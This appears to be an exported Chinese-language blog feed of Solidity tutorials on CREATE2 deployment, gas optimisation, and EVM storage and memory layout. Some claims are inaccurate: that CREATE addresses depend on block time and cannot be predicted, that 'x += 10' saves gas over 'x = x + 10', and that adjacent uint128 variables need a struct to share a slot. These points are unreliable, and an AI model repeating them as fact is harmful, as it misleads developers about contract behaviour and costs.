<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract NewContract &#123;</span><br><span class="line">    uint256 public value;</span><br><span class="line">    </span><br><span class="line">    constructor(uint256 _value) &#123;</span><br><span class="line">        value = _value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Factory &#123;</span><br><span class="line">    address public deployedContract;</span><br><span class="line">    </span><br><span class="line">    function deploy(uint256 _value, bytes32 _salt) external &#123;</span><br><span class="line">        bytes memory bytecode = type(NewContract).creationCode;  // 获取合约字节码</span><br><span class="line">        bytes32 salt = _salt;  // 使用用户传入的 salt 值</span><br><span class="line">        address contractAddress;</span><br><span class="line">        </span><br><span class="line">        assembly &#123;</span><br><span class="line">            contractAddress := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        deployedContract = contractAddress;  // 记录新合约地址</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，Factory 合约使用 create2 部署一个 NewContract 合约。通过传入 salt 值，create2 会计算出一个特定的合约地址。这样，你可以在合约部署之前预测合约的地址。合约地址的计算基于 bytecode 和 salt 的哈希，因此只要 salt 和 bytecode 不变，生成的地址也将是固定的。</p>
<h3 id="create-和-create2-的主要区别"><a href="#create-和-create2-的主要区别" class="headerlink" title="create 和 create2 的主要区别"></a>create 和 create2 的主要区别</h3><table>
<thead>
<tr>
<th align="center">特性</th>
<th align="left">create</th>
<th align="left">create2</th>
</tr>
</thead>
<tbody><tr>
<td align="center">地址生成</td>
<td align="left">由 msg.sender 地址和交易 nonce 决定</td>
<td align="left">由 msg.sender 地址、salt 和合约字节码的哈希决定</td>
</tr>
<tr>
<td align="center">预测地址</td>
<td align="left">无法预测合约地址（取决于交易 nonce 和区块时间）</td>
<td align="left">可以在合约部署前预测合约地址</td>
</tr>
<tr>
<td align="center">灵活性</td>
<td align="left">地址不可控制，无法提前决定</td>
<td align="left">可以通过不同的 salt 值控制地址并预先计算</td>
</tr>
<tr>
<td align="center">安全性</td>
<td align="left">地址依赖于交易 nonce，可能会有一定的不确定性</td>
<td align="left">地址可由部署者提前确定，减少了竞争条件</td>
</tr>
<tr>
<td align="center">适用场景</td>
<td align="left">普通合约部署</td>
<td align="left">需要提前知道合约地址的场景</td>
</tr>
<tr>
<td align="center">使用复杂度</td>
<td align="left">简单</td>
<td align="left">需要手动计算字节码和 salt</td>
</tr>
</tbody></table>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://learnblockchain.cn/article/7656">使用Create2操作码在相同的地址部署不同的代码的合约</a></li>
</ul>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity合约中如何减少gas消耗</title>
    <url>/2024/12/05/blockchain/ethereum/solidity-reduce-gas/</url>
    <content><![CDATA[<p>从设计原则、编码技巧、数据存储优化和具体示例四个方面，系统地讲解如何在 Solidity 合约中节省 Gas 费用。</p>
<h1 id="设计原则"><a href="#设计原则" class="headerlink" title="设计原则"></a>设计原则</h1><p><strong>减少合约调用次数</strong></p>
<ul>
<li>将多个逻辑步骤合并到单一函数中，避免多次外部调用。</li>
<li>尽量减少合约之间的交互，因为每次外部调用都涉及高 Gas 消耗。</li>
</ul>
<p><strong>避免频繁修改状态变量</strong></p>
<ul>
<li>修改状态变量（如 storage）比操作本地变量（如 memory）耗费更多 Gas。</li>
<li>在逻辑中优先使用本地变量，计算完后一次性更新状态变量。</li>
</ul>
<p><strong>简化复杂计算</strong></p>
<ul>
<li>将复杂计算移到链下处理，通过链上存储结果代替。</li>
<li>在链下生成哈希值等，只存储结果以减少链上计算开销。</li>
</ul>
<h1 id="编码技巧"><a href="#编码技巧" class="headerlink" title="编码技巧"></a>编码技巧</h1><h2 id="使用-view-和-pure-函数"><a href="#使用-view-和-pure-函数" class="headerlink" title="使用 view 和 pure 函数"></a>使用 view 和 pure 函数</h2><p>view 函数不修改状态，pure 函数不依赖链上状态，调用它们不消耗 Gas。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function add(uint a, uint b) public pure returns (uint) &#123;</span><br><span class="line">    return a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="精简数据类型"><a href="#精简数据类型" class="headerlink" title="精简数据类型"></a>精简数据类型</h2><ul>
<li>使用适合的数据类型，比如 uint8 而非 uint256（仅当值范围确定小于 256）。</li>
<li>避免布尔值，因为布尔操作实际存储在 256 位。</li>
</ul>
<h2 id="利用-calldata-代替-memory"><a href="#利用-calldata-代替-memory" class="headerlink" title="利用 calldata 代替 memory"></a>利用 calldata 代替 memory</h2><p>函数的外部输入参数可用 calldata，节省内存分配成本。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function processData(uint[] calldata data) external &#123;</span><br><span class="line">    // calldata 参数直接使用，无需复制</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="事件替代状态变量"><a href="#事件替代状态变量" class="headerlink" title="事件替代状态变量"></a>事件替代状态变量</h2><p>使用 emit 事件记录某些数据，而非存储状态变量。事件存储在日志中，成本低于 storage。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">event DataProcessed(address indexed user, uint amount);</span><br></pre></td></tr></table></figure>

<h2 id="合理使用-immutable-和-constant"><a href="#合理使用-immutable-和-constant" class="headerlink" title="合理使用 immutable 和 constant"></a>合理使用 immutable 和 constant</h2><ul>
<li>immutable：部署后值不可更改，但比普通变量读取快。</li>
<li>constant：在编译时决定值，不占用存储空间。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 public immutable deployTime = block.timestamp;</span><br><span class="line">uint256 public constant FEE_RATE = 100;</span><br></pre></td></tr></table></figure>

<h1 id="数据存储优化"><a href="#数据存储优化" class="headerlink" title="数据存储优化"></a>数据存储优化</h1><h2 id="批量更新状态变量"><a href="#批量更新状态变量" class="headerlink" title="批量更新状态变量"></a>批量更新状态变量</h2><p>将多次状态变量更新合并为一次。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 不推荐</span><br><span class="line">balance = balance + 10;</span><br><span class="line">counter = counter + 1;</span><br><span class="line"></span><br><span class="line">// 推荐</span><br><span class="line">balance += 10;</span><br><span class="line">counter += 1;</span><br></pre></td></tr></table></figure>

<h2 id="使用结构体或映射存储数据"><a href="#使用结构体或映射存储数据" class="headerlink" title="使用结构体或映射存储数据"></a>使用结构体或映射存储数据</h2><p>将多个相关变量合并到一个 struct 或映射中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    uint256 balance;</span><br><span class="line">    uint256 lastUpdated;</span><br><span class="line">&#125;</span><br><span class="line">mapping(address =&gt; User) users;</span><br></pre></td></tr></table></figure>

<h2 id="减少存储变量数量"><a href="#减少存储变量数量" class="headerlink" title="减少存储变量数量"></a>减少存储变量数量</h2><p>优化存储布局，减少存储槽的使用（每个槽 32 字节）。多个变量可以合并到一个存储槽中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 不推荐</span><br><span class="line">uint128 public var1;</span><br><span class="line">uint128 public var2;</span><br><span class="line"></span><br><span class="line">// 推荐</span><br><span class="line">struct Combined &#123;</span><br><span class="line">    uint128 var1;</span><br><span class="line">    uint128 var2;</span><br><span class="line">&#125;</span><br><span class="line">Combined public data;</span><br></pre></td></tr></table></figure>

<h2 id="删除不必要的状态变量"><a href="#删除不必要的状态变量" class="headerlink" title="删除不必要的状态变量"></a>删除不必要的状态变量</h2><p>使用 delete 删除已用完的存储变量，释放存储空间。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">delete users[userAddress];</span><br></pre></td></tr></table></figure>

<h1 id="其他优化建议"><a href="#其他优化建议" class="headerlink" title="其他优化建议"></a>其他优化建议</h1><ol>
<li>代码复用</li>
</ol>
<ul>
<li>将重复逻辑封装为内部函数，减少代码重复和部署大小。</li>
<li>使用库（library）减少代码复制。</li>
</ul>
<ol start="2">
<li>优化循环</li>
</ol>
<ul>
<li>避免大规模循环操作，因为每次迭代都会增加 Gas。</li>
<li>可以分阶段处理数据，减少单次调用的负载。</li>
</ul>
<ol start="3">
<li>Gas 预言机</li>
</ol>
<ul>
<li>部署前使用工具（如 Remix、Hardhat）模拟和估算 Gas。</li>
<li>优化部署的 Gas 成本。</li>
</ul>
]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>Solidity中的存储布局和内存布局</title>
    <url>/2024/12/09/blockchain/ethereum/solidity-state-layout/</url>
    <content><![CDATA[<p>EVM 的整个空间被逻辑上划分为不同的区域，分别为栈（Stack）、内存（Memory）、存储（Storage）、代码（Code）和常量区域。</p>
<p><strong>栈区域（Stack）区域</strong></p>
<ul>
<li>特点:<ul>
<li>栈是一个 固定大小 的数据区域，最大为 1024 个字（每个字 32 字节）。</li>
<li>用于存储操作数、临时值，以及函数调用的返回地址。</li>
<li>数据只能通过 push 和 pop 操作访问。</li>
</ul>
</li>
<li>作用: 函数内部的临时变量和操作数首先存储在栈中。</li>
</ul>
<p><strong>内存 (Memory)区域</strong></p>
<ul>
<li>功能: 用于临时存储数据，生命周期仅在交易或调用期间有效。</li>
<li>地址范围: 逻辑地址从<code>0</code>开始，可以按需扩展，理论上可以扩展到 <code>2^256 - 1</code>。</li>
<li>特点:<ul>
<li>按 32 字节（256 位）对齐。</li>
<li>初始化时为空（零值）。</li>
<li>按需分配时会增加 gas 消耗。</li>
</ul>
</li>
<li>作用: 用于存储函数的局部变量、动态数组、字符串、函数参数等。</li>
</ul>
<p><strong>数据调用区域（Calldata）</strong></p>
<ul>
<li>特点:<ul>
<li>是不可修改的只读区域，用于传递外部函数调用的输入数据。</li>
<li>效率高，Gas 消耗低。</li>
</ul>
</li>
<li>作用：效率高，Gas 消耗低。</li>
</ul>
<p><strong>存储 (Storage)区域</strong></p>
<ul>
<li>地址范围：存储区域的地址范围是从 0 到 2^256 - 1。</li>
<li>存储单元：每个存储槽（storage slot）大小为 32 字节（256 位）。</li>
<li>访问方式：存储按照 键值对的形式 存储，每个键为 256 位的存储槽地址，每个值为 256 位的存储内容。</li>
<li>作用：存储合约的全局状态。</li>
</ul>
<h1 id="Storage-Layout-存储布局"><a href="#Storage-Layout-存储布局" class="headerlink" title="Storage Layout (存储布局)"></a>Storage Layout (存储布局)</h1><p>存储状态布局涉及 合约的存储变量如何映射到 EVM 的存储空间。EVM 的存储空间是一个巨大的 256 位地址空间，采用键值对形式。每个存储槽（slot）存储 32 字节数据。</p>
<p>EVM 的存储区域采用 哈希映射结构 存储数据：</p>
<ul>
<li>简单变量：直接按照顺序存储，每个变量占用一个或部分存储槽。</li>
<li>复杂数据结构：<ul>
<li>数组：第一个槽存储长度，数据存储在 <code>keccak256(slot)</code> 地址开始的连续存储槽中。</li>
<li>映射：数据存储在 <code>keccak256(key, slot)</code> 地址处，key 是映射键，slot 是映射变量在合约中的存储槽编号。</li>
<li>结构体：将结构体的成员顺序存储，每个成员分配单独的存储槽。</li>
</ul>
</li>
</ul>
<h2 id="存储分配规则"><a href="#存储分配规则" class="headerlink" title="存储分配规则"></a>存储分配规则</h2><ol>
<li><p>基础规则</p>
<ul>
<li>变量顺序存储: 每个状态变量按声明顺序分配存储槽，优先填充当前槽剩余空间。</li>
<li>一个槽的大小为 32 字节。</li>
<li>如果变量类型大小超过槽大小（如 uint256），则占据一个完整槽。</li>
<li>较小变量（如 uint8、bool）在同一槽中紧密打包，但不能跨槽。</li>
</ul>
</li>
<li><p>映射（Mapping）</p>
<ul>
<li>映射的键值对（key-value）不会紧密打包在槽中。</li>
<li>每个键（key）对应的值（value）存储在一个唯一的槽中，其地址由<code>keccak256(key, slot)</code> 计算</li>
<li>键（key）不会存储在存储区域中，键值（key-value）对中的“键（key）”并没有单独存储的槽。所以无法直接遍历Mapping</li>
</ul>
</li>
<li><p>动态数组与字符串</p>
<ul>
<li>元数据存储：动态数组的主槽（主存储槽）中存储的是数组的长度。</li>
<li>数据存储：数组的实际数据存储在与主槽分开的连续存储槽中。<ul>
<li>数据槽的起始地址由 keccak256(slot) 计算得出，slot 是动态数组的主槽编号。</li>
<li>数组中的每个元素按照顺序依次存储在数据槽中。</li>
</ul>
</li>
<li>字符串与动态数组处理相似。</li>
</ul>
</li>
<li><p>结构体（Struct）</p>
<ul>
<li>结构体的变量按顺序存储。</li>
<li>结构体变量紧密打包（类似单个槽中存储的变量）。</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract StateLayoutExample &#123;</span><br><span class="line">    uint256 public number;         // Slot 0</span><br><span class="line">    bool public flag;              // Slot 1 (packed with `smallValue` if space allows)</span><br><span class="line">    uint16 public smallValue;      // Slot 1</span><br><span class="line">    mapping(uint256 =&gt; uint256) public map; // Data stored at keccak256(key, 2)</span><br><span class="line">    uint256[] public dynamicArray; // Slot 3: array length; data starts at keccak256(3)</span><br><span class="line">    struct MyStruct &#123;</span><br><span class="line">        uint256 largeValue;        // Slot 4</span><br><span class="line">        uint8 smallPart;           // Slot 4 (packed with other struct fields)</span><br><span class="line">    &#125;</span><br><span class="line">    MyStruct public myStruct;      // Struct occupies its own slots</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行命令 <code>solc --storage-layout --transient-storage-layout StateLayoutExample.sol</code> 查看合约存储布局 </p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;storage&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">3</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;number&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">5</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;flag&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_bool&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">7</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;smallValue&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint16&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">11</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;map&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_mapping(t_uint256,t_uint256)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">14</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;dynamicArray&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;3&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_array(t_uint256)dyn_storage&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">22</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;myStruct&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;4&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_struct(MyStruct)19_storage&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;types&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;t_array(t_uint256)dyn_storage&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;base&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;dynamic_array&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;uint256[]&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;32&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_bool&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;bool&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_mapping(t_uint256,t_uint256)&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;mapping&quot;</span><span class="punctuation">,</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;mapping(uint256 =&gt; uint256)&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;32&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_struct(MyStruct)19_storage&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;struct StateLayoutExample.MyStruct&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;members&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">16</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;largeValue&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;0&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint256&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="punctuation">&#123;</span><span class="attr">&quot;astId&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">,</span><span class="attr">&quot;contract&quot;</span><span class="punctuation">:</span><span class="string">&quot;StateLayoutExample.sol:StateLayoutExample&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;smallPart&quot;</span><span class="punctuation">,</span><span class="attr">&quot;offset&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;slot&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;t_uint8&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;64&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_uint16&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;uint16&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_uint256&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;uint256&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;32&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;t_uint8&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;inplace&quot;</span><span class="punctuation">,</span><span class="attr">&quot;label&quot;</span><span class="punctuation">:</span><span class="string">&quot;uint8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;numberOfBytes&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>storage</strong></p>
<p>描述每个状态变量的存储位置：<br>    - <code>slot</code>: 存储槽号。<br>    - <code>offset</code>: 偏移量，表示变量在槽内的起始位置。<br>    - <code>type</code>: 变量的类型标识，与 types 部分中的描述对应。</p>
<p><strong>types</strong></p>
<p>定义每种数据类型的详细信息：<br>    - <code>encoding</code>: 数据的存储方式（如 inplace 或 dynamic_array）。<br>    - <code>numberOfBytes</code>: 占用的字节数。<br>    - <code>members</code>: 如果是结构体，列出所有成员及其存储位置。<br>    - <code>base</code>: 如果是数组，表示基础类型。</p>
<h1 id="Memory-Layout-内存布局"><a href="#Memory-Layout-内存布局" class="headerlink" title="Memory Layout (内存布局)"></a>Memory Layout (内存布局)</h1><p>在 Solidity 中，内存（Memory） 是 EVM 提供的一种线性存储结构，主要用于在函数调用过程中存储临时变量、局部变量和中间计算结果。内存是按需分配的，不同于存储（Storage），内存是 瞬时的，在调用结束后会被释放，且读写成本较低。</p>
<p>内存是一个 按字节寻址的线性空间，地址范围从 0x00 到无限大（理论上为 2^256 - 1）。但在实际操作中，内存的分配是动态增长的，EVM 会根据需要分配内存，并且以 32 字节（一个字）为单位扩展。</p>
<pre><code>- 每个内存地址存储一个字节。
- 每 32 个字节组成一个字（word），这是 EVM 操作的基本单位。
</code></pre>
<p>内存布局的设计遵循以下原则：</p>
<ol>
<li>按需动态分配:<ul>
<li>Solidity 会在需要时从内存中分配新的空间。</li>
<li>起始空闲内存地址存储在 0x40，可通过 mload(0x40) 获取。</li>
</ul>
</li>
<li>按 32 字节对齐:<ul>
<li>内存分配是以 32 字节为单位对齐的，即使是 bool 等小数据类型也会占用 32 字节。</li>
</ul>
</li>
<li>变量存储位置:<ul>
<li>固定大小类型直接存储其值。</li>
<li>动态类型存储一个指针，指向实际数据的内存地址。</li>
</ul>
</li>
</ol>
<h2 id="固定分配区域"><a href="#固定分配区域" class="headerlink" title="固定分配区域"></a>固定分配区域</h2><p>Solidity保留了四个32字节的插槽，具体的字节范围（包括端点）使用如下：</p>
<ul>
<li>0x00 ~ 0x3f（64Byte）<ul>
<li>用于哈希方法的临时空间</li>
<li>临时空间可以在语句之间使用（即在内联汇编之中）。</li>
</ul>
</li>
<li>0x40 ~ 0x5f (Free memory pointer 32Byte):<ul>
<li>mstore(0x40, …) 用于指向当前空闲内存的起始地址。</li>
<li>Solidity 使用内存时，会从该地址开始分配。</li>
<li>开发者不需要手动管理，但在使用汇编时，需要注意维护 0x40 的正确值。</li>
</ul>
</li>
<li>0x60 ~ 0x7f（Zero pointer 32Byte):<ul>
<li>保留一块全零的内存区域，通常用于返回零值。</li>
<li>0值插槽则用来对动态内存数组进行初始化，且永远不会写入数据 （因而可用的初始内存指针为 0x80）。</li>
</ul>
</li>
</ul>
<p>Solidity 总会把新对象保存在空闲内存指针的位置， 所以这段内存实际上从来不会空闲（在未来可能会修改这个机制）。</p>
<h2 id="动态分配区域"><a href="#动态分配区域" class="headerlink" title="动态分配区域"></a>动态分配区域</h2><p>Solidity 的局部变量、动态数组和字符串都从 0x80 开始动态分配，并按照实际需要扩展。</p>
<p>分配规则：<br>    - 内存分配以 32 字节为单位对齐。<br>    - 临时变量直接写入内存对应的位置。<br>    - 动态类型需要额外存储元数据（如长度和起始地址）。</p>
<h2 id="内存中的数据类型布局"><a href="#内存中的数据类型布局" class="headerlink" title="内存中的数据类型布局"></a>内存中的数据类型布局</h2><h3 id="固定大小的类型"><a href="#固定大小的类型" class="headerlink" title="固定大小的类型"></a>固定大小的类型</h3><ul>
<li>包括 uint256、address、bool 等。</li>
<li>直接按 32 字节对齐存储，例如：<ul>
<li>uint256 占用 32 字节。</li>
<li>bool 也占用 32 字节（尽管实际值只需 1 字节）。</li>
</ul>
</li>
</ul>
<h3 id="动态类型"><a href="#动态类型" class="headerlink" title="动态类型"></a>动态类型</h3><p>动态类型（如 string、bytes 和动态数组）会分为两个部分：</p>
<ol>
<li>指针部分：主变量存储的是指向实际数据的偏移量（相对于起始地址 0x80 的偏移量）。</li>
<li>数据部分：存储动态类型的元数据（如长度）和实际数据。</li>
</ol>
